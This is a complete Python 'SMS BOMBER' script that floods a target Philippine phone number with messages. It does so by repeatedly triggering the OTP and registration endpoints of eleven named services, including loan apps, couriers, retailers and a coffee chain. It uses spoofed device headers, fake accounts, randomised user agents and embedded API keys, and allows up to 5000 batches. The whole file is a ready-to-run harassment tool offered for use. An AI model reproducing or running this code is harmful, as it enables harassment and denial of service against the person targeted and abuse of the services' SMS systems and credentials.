#!/usr/bin/env python3

import asyncio
import aiohttp
import random
import string
import json
import sys
import os
from typing import List, Tuple
import time

# Check and install required packages
def install_packages():
    required_packages = [
        'aiohttp',
        'requests',
        'colorama',
        'pyfiglet',
        'asyncio-throttle'
    ]
    
    for package in required_packages:
        try:
            if package == 'asyncio-throttle':
                import asyncio_throttle
            elif package == 'colorama':
                import colorama
            elif package == 'pyfiglet':
                import pyfiglet
            else:
                __import__(package)
        except ImportError:
            print(f"Installing {package}...")
            os.system(f"{sys.executable} -m pip install {package}")

# Install packages before imports
install_packages()

import requests
from colorama import Fore, Style, init
import pyfiglet
from asyncio_throttle import Throttler

# Initialize colorama
init(autoreset=True)

class SMSBomber:
    def __init__(self):
        self.success_count = 0
        self.fail_count = 0
        self.throttler = Throttler(rate_limit=10, period=1)  # 10 requests per second
        
    def show_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        title = pyfiglet.figlet_format("SMS BOMBER", font="standard")
        print(self.gradient_text(title, ['#FF5F6D', '#FFC371']))
        print(Fore.LIGHTBLACK_EX + "───────────────────────────────────────────────")
        print(self.gradient_text("         By KENH4X | LIFETIME ACCESS UNLIMITED FAST BOMBING", ['#4A00E0', '#8E2DE2']))
        print(Fore.LIGHTBLACK_EX + "───────────────────────────────────────────────\n")
    
    def gradient_text(self, text, colors):
        # Simple gradient simulation using colorama
        color_sequence = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
        result = ""
        for i, char in enumerate(text):
            if char == '\n':
                result += char
                continue
            color_index = i % len(color_sequence)
            result += color_sequence[color_index] + char
        return result
    
    def random_string(self, length):
        chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
        return ''.join(random.choice(chars) for _ in range(length))
    
    def normalize_phone_number(self, phone):
        phone = phone.replace(' ', '').replace('-', '')
        
        if phone.startswith('0'):
            return '+63' + phone[1:]
        elif phone.startswith('63') and not phone.startswith('+63'):
            return '+' + phone
        elif not phone.startswith('+63') and len(phone) == 10:
            return '+63' + phone
        elif not phone.startswith('+'):
            return '+63' + phone
        
        return phone
    
    def format_number(self, number):
        if number.startswith('+63'):
            return number
        elif number.startswith('09'):
            return '+63' + number[2:]
        elif number.startswith('9'):
            return '+63' + number
        return number
    
    def validate_number(self, number):
        clean_number = number.replace(' ', '')
        patterns = [
            r'^09\d{9}$',
            r'^9\d{9}$', 
            r'^\+639\d{9}$'
        ]
        import re
        for pattern in patterns:
            if re.match(pattern, clean_number):
                return True
        return False
    
    async def send_request(self, session, method, url, headers=None, data=None, json_data=None, timeout=10):
        try:
            async with self.throttler:
                if method.upper() == 'POST':
                    if json_data:
                        async with session.post(url, headers=headers, json=json_data, timeout=timeout) as response:
                            return response.status in [200, 201, 202]
                    else:
                        async with session.post(url, headers=headers, data=data, timeout=timeout) as response:
                            return response.status in [200, 201, 202]
                else:
                    async with session.get(url, headers=headers, timeout=timeout) as response:
                        return response.status == 200
        except Exception as e:
            return False
    
    async def send_ezloan(self, session, number_to_send):
        headers = {
            'User-Agent': 'okhttp/4.9.2',
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
            'accept-language': 'en',
            'imei': 'e933e51d8c994b05b5a0d523c84f8287',
            'device': 'android',
            'buildtype': 'release',
            'brand': 'POCO',
            'model': '2207117BPG',
            'manufacturer': 'Xiaomi',
            'source': 'EZLOAN',
            'channel': 'GooglePlay_Blue',
            'appversion': '2.0.4',
            'appversioncode': '2000402',
            'version': '2.0.4',
            'versioncode': '2000401',
            'sysversion': '15',
            'sysversioncode': '35',
            'customerid': '',
            'businessid': 'EZLOAN',
            'phone': '',
            'appid': 'EZLOAN',
            'authorization': '',
            'blackbox': 'qGPG61760445001tnR5bweVKGe',
            'Cookie': 'sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%22199e2b212bc118-0da93596827e478-37661333-343089-199e2b212bd9b%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E7%9B%B4%E6%8E%A5%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC_%E7%9B%B4%E6%8E%A5%E6%89%93%E5%BC%80%22%2C%22%24latest_referrer%22%3A%22%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29ua2llX2lkIjoiMTk5ZTJiMjEyYmMxMTgtMGRhOTM1OTY4MjdlNDc4LTM3NjYxMzMzLTM0MzA4OS0xOTllMmIyMTJiZDliIn0%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%22199e2b212bc118-0da93596827e478-37661333-343089-199e2b212bd9b%22%7D; _fbp=fb.1.1760444945208.257083461139881056'
        }
        
        json_data = {
            "businessId": "EZLOAN",
            "contactNumber": number_to_send,
            "appsflyerIdentifier": "1760444943092-3966994042140191452"
        }
        
        success = await self.send_request(session, 'POST', 
                                        'https://gateway.ezloancash.ph/security/auth/otp/request',
                                        headers=headers, json_data=json_data)
        
        if success:
            print(Fore.GREEN + '   ✓ EZLOAN')
            self.success_count += 1
        else:
            print(Fore.RED + '   ✗ EZLOAN')
            self.fail_count += 1
        
        return success
    
    async def send_xpress(self, session, number_to_send, i):
        formatted_num = self.format_number(number_to_send)
        fingerprint_visitor_id = "TPt0yCuOFim3N3rzvrL1"
        fingerprint_request_id = "1757149666261.Rr1VvG"
        
        json_data = {
            "FirstName": "user",
            "LastName": "test",
            "Email": f"user{int(time.time())}_{i}@gmail.com",
            "Phone": formatted_num,
            "Password": "Pass1234",
            "ConfirmPassword": "Pass1234",
            "FingerprintVisitorId": fingerprint_visitor_id,
            "FingerprintRequestId": fingerprint_request_id,
        }
        
        headers = {
            "User-Agent": "Dalvik/2.1.0",
            "Content-Type": "application/json",
        }
        
        success = await self.send_request(session, 'POST',
                                        "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
                                        headers=headers, json_data=json_data)
        
        if success:
            print(Fore.GREEN + '   ✓ XPRESS PH')
            self.success_count += 1
        else:
            print(Fore.RED + '   ✗ XPRESS PH')
            self.fail_count += 1
        
        return success
    
    async def send_abenson(self, session, number_to_send):
        data = f"contact_no={number_to_send}&login_token=undefined"
        
        headers = {
            'User-Agent': 'okhttp/4.9.0',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.mobile.abenson.com/api/public/membership/activate_otp',
                                        headers=headers, data=data)
        
        if success:
            print(Fore.GREEN + '   ✓ ABENSON')
            self.success_count += 1
        else:
            print(Fore.RED + '   ✗ ABENSON')
            self.fail_count += 1
        
        return success
    
    async def send_excellent_lending(self, session, number_to_send):
        coordinates = [
            {'lat': '14.5995', 'long': '120.9842'},
            {'lat': '14.6760', 'long': '121.0437'},
            {'lat': '14.8648', 'long': '121.0418'}
        ]
        user_agents = [
            'okhttp/4.12.0',
            'okhttp/4.9.2',
            'Dart/3.6 (dart:io)',
        ]
        
        coord = random.choice(coordinates)
        agent = random.choice(user_agents)
        
        json_data = {
            "domain": number_to_send,
            "cat": "login",
            "previous": False,
            "financial": "efe35521e51f924efcad5d61d61072a9"
        }
        
        headers = {
            'User-Agent': agent,
            'Content-Type': 'application/json; charset=utf-8',
            'x-latitude': coord['lat'],
            'x-longitude': coord['long']
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                                        headers=headers, json_data=json_data)
        
        if success:
            print(Fore.GREEN + '   ✓ EXCELLENT LENDING')
            self.success_count += 1
        else:
            print(Fore.RED + '   ✗ EXCELLENT LENDING')
            self.fail_count += 1
        
        return success
    
    async def send_fortune_pay(self, session, number_to_send):
        json_data = {
            "deviceId": 'c31a9bc0-652d-11f0-88cf-9d4076456969',
            "deviceType": 'GOOGLE_PLAY',
            "companyId": '4bf735e97269421a80b82359e7dc2288',
            "dialCode": '+63',
            "phoneNumber": number_to_send.replace('+63', '').lstrip('0')
        }
        
        headers = {
            'User-Agent': 'Dart/3.6 (dart:io)',
            'Content-Type': 'application/json',
            'app-type': 'GOOGLE_PLAY',
            'authorization': 'Bearer',
            'app-version': '4.3.5',
            'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
            'timestamp': str(int(time.time() * 1000)),
            'nonce': f"{self.random_string(10)}-{int(time.time() * 1000)}"
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
                                        headers=headers, json_data=json_data)
        
        if success:
            print(Fore.GREEN + '   ✓ FORTUNE PAY')
            self.success_count += 1
        else:
            print(Fore.RED + '   ✗ FORTUNE PAY')
            self.fail_count += 1
        
        return success
    
    async def send_wemove(self, session, number_to_send):
        json_data = {
            "phone_country": '+63',
            "phone_no": number_to_send.replace('+63', '').lstrip('0')
        }
        
        headers = {
            'User-Agent': 'okhttp/4.9.3',
            'Content-Type': 'application/json',
            'xuid_type': 'user',
            'source': 'customer',
            'authorization': 'Bearer'
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.wemove.com.ph/auth/users',
                                        headers=headers, json_data=json_data)
        
        if success:
            print(Fore.GREEN + '   ✓ WEMOVE')
            self.success_count += 1
        else:
            print(Fore.RED + '   ✗ WEMOVE')
            self.fail_count += 1
        
        return success
    
    async def send_lbc(self, session, number_to_send):
        data = {
            "verification_type": 'mobile',
            "client_email": f"{self.random_string(8)}@gmail.com",
            "client_contact_code": '+63',
            "client_contact_no": number_to_send.replace('+63', '').lstrip('0'),
            "app_log_uid": self.random_string(16),
        }
        
        # Convert to form data
        form_data = "&".join([f"{k}={v}" for k, v in data.items()])
        
        headers = {
            'User-Agent': 'Dart/2.19 (dart:io)',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
                                        headers=headers, data=form_data)
        
        if success:
            print(Fore.GREEN + '   ✓ LBC CONNECT')
            self.success_count += 1
        else:
            print(Fore.RED + '   ✗ LBC CONNECT')
            self.fail_count += 1
        
        return success
    
    async def send_pickup_coffee(self, session, number_to_send):
        user_agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
        formatted_num = self.format_number(number_to_send)
        
        json_data = {
            "mobile_number": formatted_num,
            "login_method": 'mobile_number'
        }
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Content-Type': 'application/json',
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://production.api.pickup-coffee.net/v2/customers/login',
                                        headers=headers, json_data=json_data)
        
        if success:
            print(Fore.GREEN + '   ✓ PICKUP COFFEE')
            self.success_count += 1
        else:
            print(Fore.RED + '   ✗ PICKUP COFFEE')
            self.fail_count += 1
        
        return success
    
    async def send_honey_loan(self, session, number_to_send):
        json_data = {
            "phone": number_to_send,
            "is_rights_block_accepted": 1
        }
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
            'Content-Type': 'application/json',
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.honeyloan.ph/api/client/registration/step-one',
                                        headers=headers, json_data=json_data)
        
        if success:
            print(Fore.GREEN + '   ✓ HONEY LOAN')
            self.success_count += 1
        else:
            print(Fore.RED + '   ✗ HONEY LOAN')
            self.fail_count += 1
        
        return success
    
    async def send_komo_ph(self, session, number_to_send):
        json_data = {
            "mobile": number_to_send,
            "transactionType": 6
        }
        
        headers = {
            'Content-Type': 'application/json',
            'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
            'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
        }
        
        success = await self.send_request(session, 'POST',
                                        'https://api.komo.ph/api/otp/v5/generate',
                                        headers=headers, json_data=json_data)
        
        if success:
            print(Fore.GREEN + '   ✓ KOMO PH')
            self.success_count += 1
        else:
            print(Fore.RED + '   ✗ KOMO PH')
            self.fail_count += 1
        
        return success
    
    async def send_s5_otp(self, session, number_to_send):
        try:
            normalized_phone = self.normalize_phone_number(number_to_send)
            
            headers = {
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary4wi4VH3ZsWtBXCct',
                'origin': 'https://www.s5.com',
                'referer': 'https://www.s5.com/',
                'sec-ch-ua': '"Chromium";v="127", "Not)A;Brand";v="99", "Microsoft Edge Simulate";v="127", "Lemur";v="127"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
                'x-api-type': 'external',
                'x-locale': 'en',
                'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
                'x-timezone-offset': '480'
            }

            body = f"------WebKitFormBoundary4wi4VH3ZsWtBXCct\r\nContent-Disposition: form-data; name=\"phone_number\"\r\n\r\n{normalized_phone}\r\n------WebKitFormBoundary4wi4VH3ZsWtBXCct--\r\n"

            success = await self.send_request(session, 'POST',
                                            'https://api.s5.com/player/api/v1/otp/request',
                                            headers=headers, data=body)
            
            if success:
                print(Fore.GREEN + '   ✓ S5.COM')
                self.success_count += 1
            else:
                print(Fore.RED + '   ✗ S5.COM')
                self.fail_count += 1
            
            return success
        except Exception as e:
            print(Fore.RED + '   ✗ S5.COM')
            self.fail_count += 1
            return False
    
    async def execute_attack(self, number_to_send, amount):
        print(self.gradient_text('Starting SMS bomb attack...', ['#FF5F6D', '#FFC371']))
        
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20)
        timeout = aiohttp.ClientTimeout(total=30)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for i in range(1, amount + 1):
                tasks = []

                print(Fore.YELLOW + f"\n[{i}/{amount}] Sending batch requests...")

                # Add all service tasks
                tasks.append(self.send_ezloan(session, number_to_send))
                tasks.append(self.send_xpress(session, number_to_send, i))
                tasks.append(self.send_abenson(session, number_to_send))
                tasks.append(self.send_excellent_lending(session, number_to_send))
                tasks.append(self.send_fortune_pay(session, number_to_send))
                tasks.append(self.send_wemove(session, number_to_send))
                tasks.append(self.send_lbc(session, number_to_send))
                tasks.append(self.send_pickup_coffee(session, number_to_send))
                tasks.append(self.send_honey_loan(session, number_to_send))
                tasks.append(self.send_komo_ph(session, number_to_send))
                tasks.append(self.send_s5_otp(session, number_to_send))

                # Execute all tasks
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Count successful tasks
                successful = sum(1 for result in results if result is True)
                
                print(self.gradient_text(f"Batch {i} completed: {Fore.GREEN}{successful} success | {Fore.RED}{len(tasks) - successful} failed", ['#4A00E0', '#8E2DE2']))
                
                # Random delay between batches
                delay = random.uniform(1, 3)
                await asyncio.sleep(delay)
    
    def get_stats(self):
        return {
            'success': self.success_count,
            'failed': self.fail_count,
            'total': self.success_count + self.fail_count
        }
    
    def reset_stats(self):
        self.success_count = 0
        self.fail_count = 0

async def main_menu():
    bomber = SMSBomber()
    
    while True:
        bomber.show_banner()
        print(Fore.YELLOW + '[1] Start SMS Bomber')
        print(Fore.YELLOW + '[2] About')
        print(Fore.YELLOW + '[0] Exit\n')
        
        choice = input(Fore.CYAN + 'Select: ')
        
        if choice == '1':
            await start_attack(bomber)
        elif choice == '2':
            await about_section()
        elif choice == '0':
            print(Fore.RED + '\nExiting...')
            break
        else:
            print(Fore.RED + 'Invalid choice.')
            input('\nPress Enter to continue...')

async def about_section():
    os.system('cls' if os.name == 'nt' else 'clear')
    bomber = SMSBomber()
    print(bomber.gradient_text('SMS Bomber v3.0\n', ['#FF5F6D', '#FFC371']))
    print(Fore.GREEN + 'LIFETIME ACCESS UNLIMITED FAST BOMBING\n')
    print(Fore.LIGHTBLACK_EX + 'Tool developed for stable use.\nAvoid exceeding limits to prevent number blocking.\nMultiple service providers for maximum coverage.\n')
    input(Fore.CYAN + 'Press Enter to go back...')

async def start_attack(bomber):
    bomber.show_banner()
    
    print(Fore.YELLOW + '[INFO] PHONE FORMAT: 09123456789 / 9123456789\n')
    
    number_input = input('Target Number: ')
    amount_input = input('Amount (MAX 5000): ')

    if not bomber.validate_number(number_input):
        print(Fore.RED + '\nInvalid phone number format!')
        input('\nPress Enter to continue...')
        return

    try:
        amount = int(amount_input) if amount_input else 100
    except ValueError:
        amount = 100
    
    if amount > 5000:
        print(Fore.YELLOW + '\nAmount set to maximum 5000')
        amount = 5000
    
    if amount < 1:
        print(Fore.RED + '\nAmount must be at least 1')
        input('\nPress Enter to continue...')
        return

    print(Fore.YELLOW + '\nInitializing attack...')
    print(bomber.gradient_text(f"Target: {number_input}", ['#4A00E0', '#8E2DE2']))
    print(bomber.gradient_text(f"Batches: {amount}\n", ['#4A00E0', '#8E2DE2']))

    await bomber.execute_attack(number_input, amount)

    stats = bomber.get_stats()
    
    print(bomber.gradient_text('\n╔══════════════════════════════════╗', ['#FF5F6D', '#FFC371']))
    print(bomber.gradient_text('║          ATTACK COMPLETE         ║', ['#FF5F6D', '#FFC371']))
    print(bomber.gradient_text('╚══════════════════════════════════╝', ['#FF5F6D', '#FFC371']))
    print(Fore.GREEN + f"✓ Successful: {stats['success']}")
    print(Fore.RED + f"✗ Failed: {stats['failed']}")
    print(Fore.CYAN + f"Total: {stats['total']}")
    print(bomber.gradient_text(f"Target: {number_input}", ['#4A00E0', '#8E2DE2']))

    again = input('\nLaunch another attack? (y/n): ')
    if again.lower() == 'y':
        bomber.reset_stats()
        await start_attack(bomber)

if __name__ == "__main__":
    try:
        asyncio.run(main_menu())
    except KeyboardInterrupt:
        print(Fore.YELLOW + '\nProcess terminated by user')
    except Exception as e:
        print(Fore.RED + f'\nUnexpected error occurred: {e}')